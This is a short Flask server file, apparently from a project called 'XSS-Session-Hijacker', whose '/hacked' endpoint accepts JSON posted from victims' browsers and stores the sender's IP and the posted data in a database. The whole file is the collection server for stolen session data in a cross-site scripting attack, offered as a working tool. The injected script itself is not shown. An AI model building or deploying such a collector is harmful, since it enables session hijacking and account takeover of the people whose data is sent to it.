from flask import Flask, jsonify, request
from model import HackedData, db
import json

app = Flask(
    import_name=__name__,
    static_url_path='/static',
    static_folder='./static',
)
app.config.from_file('config.json', load=json.load)

# init db
db.init_app(app)


@app.before_first_request
def configure_app():
    # create tables
    db.create_all()


@app.route('/')
def home():
    return jsonify({
        'project': 'XSS-Session-Hijacker',
        'writtenBy': 'dmdhrumilmistry',
        'github': 'https://github.com/dmdhrumilmistry',
        'website': 'https://dmdhrumilmistry.github.io',
    })


@app.route('/hacked', methods=['POST'])
def get_hacked_data():
    res = {'message': 'json data needed'}
    res_code = 400

    # check whether if POST request has json data
    if request.is_json:
        ip = request.remote_addr
        data = request.get_json().get('data', None)

        # extract and commit json data to database
        if data:
            new_hacked_data = HackedData(
                ip=ip,
                data=data
            )
            db.session.add(new_hacked_data)
            db.session.commit()
            res = {'message': 'success'}
            res_code = 200
    return jsonify(res), res_code
